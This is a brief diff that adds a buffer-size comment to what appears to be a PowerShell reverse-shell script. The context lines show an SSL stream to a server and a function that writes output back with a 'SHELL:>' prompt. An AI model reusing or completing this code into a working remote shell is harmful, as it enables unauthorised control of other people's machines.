@@ -29,6 +29,7 @@ if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
 $streamWriter = New-Object System.IO.StreamWriter($sslStream)
 
 function writeStreamToServer($string){
+    # create buffer for the next network stream read. buffer size is the default size of the tcp client which is 65536 bytes.
     [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
     $streamWriter.Write($string + 'SHELL:>')
     $streamWriter.Flush()
